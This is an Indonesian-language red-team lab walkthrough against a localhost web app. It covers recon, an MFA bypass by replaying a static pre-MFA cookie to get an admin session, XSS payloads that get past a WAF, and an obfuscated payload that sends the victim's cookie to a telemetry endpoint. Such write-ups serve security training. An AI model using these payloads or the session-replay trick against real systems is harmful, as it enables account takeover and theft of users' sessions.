# 🔴 Red Team Walkthrough 

https://github.com/user-attachments/assets/592792bc-3f97-48b6-93b5-2c5ec6489ec4

> Target: `http://localhost:3075` (lingkungan latihan/lab)

---

## Langkah 1 — Recon Awal
Buka di browser: `http://localhost:3075/`  
Terlihat ada action ke endpoint `/feedback`.

## Langkah 2 — Uji XSS di Feedback
```bash
curl -i -X POST http://localhost:3075/feedback \
  -d 'message=<script>alert(1)</script>'
```
**Hasil:** `403 Forbidden` → diblokir WAF.  
➡️ Berarti input XSS dibatasi, bukan berarti mati.

## Langkah 3 — Cari Info via robots.txt
```bash
curl http://localhost:3075/robots.txt
```
Isi:
```
User-agent: *
Disallow: /api/verify-mfa
Disallow: /dashboard
```
**Insight:** `/dashboard` dilindungi MFA, dan ada endpoint `/api/verify-mfa`.

## Langkah 4 — Inspeksi Response Header
Pakai DevTools / webslurp, perhatikan:
```
x-powered-by: Node.js
set-cookie: pre_mfa_session=pending_mfa_verification; Path=/; SameSite=Lax
```
**Insight:** Cookie `pre_mfa_session` dibuat dengan nilai statis `pending_mfa_verification` → kandidat bypass.

## Langkah 5 — Bypass MFA (Session Replay)
```bash
curl -i \
  -H 'Cookie: pre_mfa_session=pending_mfa_verification' \
  http://localhost:3075/api/session/replay
```
**Hasil:** `200 OK`
```json
{"ok":true,"bypassedMfa":true,"session":"adm_sess_replay_cGVuZGluZ19t"}
```
➡️ Kita dapat session admin: `adm_sess_replay_cGVuZGluZ19t`.

## Langkah 6 — Akses Dashboard Tanpa MFA
```bash
curl -i \
  -H 'Cookie: adm_sess=adm_sess_replay_cGVuZGluZ19t' \
  http://localhost:3075/dashboard
```
**Hasil:** `200 OK` → Dashboard berhasil diakses tanpa lewat `/api/verify-mfa`. ✅

## Langkah 7 — WAF Bypass untuk XSS
Coba beberapa payload ke `/api/telemetry`:

| Payload | Hasil |
|---|---|
| `<script>alert(1)</script>` | ❌ diblokir WAF |
| `<svg onload="document.cookie">` | ❌ diblokir WAF |
| `<svg onload=alert(1)>` | ✅ **lolos** |

**Insight:** WAF lemah terhadap atribut tanpa tanda kutip.

## Langkah 8 — Exfiltrasi Cookie via XSS
Gunakan payload yang sudah lolos untuk mencuri cookie ke endpoint telemetry:
```html
<svg onload="fetch('/api/telemetry',{
  method:'POST',
  headers:{'Content-Type':'application/json'},
  body:JSON.stringify({cookie:window['docu'+'ment']['coo'+'kie']})
})">
```
**Tujuan:** Mengirim cookie korban ke `/api/telemetry` untuk diambil alih.

---

## 🧭 Ringkasan Alur Serangan
1. Recon endpoint (`/feedback`).
2. WAF blokir XSS dasar → cari jalur lain.
3. `robots.txt` bocorkan struktur & proteksi MFA.
4. Header bocorkan cookie `pre_mfa_session` statis.
5. Replay cookie → dapat session admin.
6. Akses `/dashboard` tanpa verifikasi MFA.
7. Bypass WAF XSS dengan payload tanpa tanda kutip.
8. Exfiltrasi cookie korban via `/api/telemetry`.
